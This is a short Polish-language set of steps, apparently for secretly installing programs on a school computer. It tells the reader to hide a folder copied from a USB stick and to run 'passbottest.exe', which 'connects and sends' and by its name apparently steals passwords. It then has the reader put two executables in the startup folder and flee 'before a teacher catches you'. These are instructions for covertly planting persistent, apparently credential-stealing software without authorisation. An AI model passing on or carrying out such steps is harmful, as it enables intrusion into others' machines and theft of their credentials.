Jak zainstalować program na komputerze.

1. Wrzuć z pendrive'a na komputer cały folder (najlepiej wsadzić gdzieś głęboko i zmienić dostępność na ukryty)
2. W ustawieniach wejdź w Prywatność i zabezpieczenia > Dla deweloperów
3. Zmień terminal na Host Konsoli Systemu Windows
4. Uruchom aplikację "passbottest.exe". Jeśli się połączy i wyśle przejdź do następnego kroku
5. Włącz "CProject.exe"
6. Sprawdź czy na pewno jest zmieniona na host konsoli (po odpaleniu programu poraz pierwszy może się to automatycznie zmienić)
7. Dodaj aplikację "PProject.exe" i "CProject.exe" do autostartu (win+r wpisujesz shell:startup i wklejasz tam SKRÓTY programów)
8. Wyjmij pendrive i uciekaj zanim cię dorwie jakiś nauczyciel